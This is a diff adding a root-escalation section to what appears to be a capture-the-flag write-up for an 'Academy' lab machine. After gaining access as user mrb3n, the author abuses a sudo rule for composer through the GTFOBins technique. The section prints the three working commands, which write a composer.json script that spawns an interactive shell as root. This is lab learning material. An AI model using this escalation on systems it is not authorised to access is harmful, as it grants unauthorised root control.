@@ -85,6 +85,17 @@ LinPEAS found mrb3n's password in /var/log/audit log file
 So now we can login as mrb3n  
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/mrb3n.PNG)  
 
+Geting root
+--------
+Using 'sudo -l' command showed us that mrb3n can run '/composer' as super user
+
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/sudo%20l.PNG)  
+
+After some googling i found [GTFOBins ./composer page](https://gtfobins.github.io/gtfobins/composer/)
+
+Using following commands we can get the root privileges:
+````
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
+````
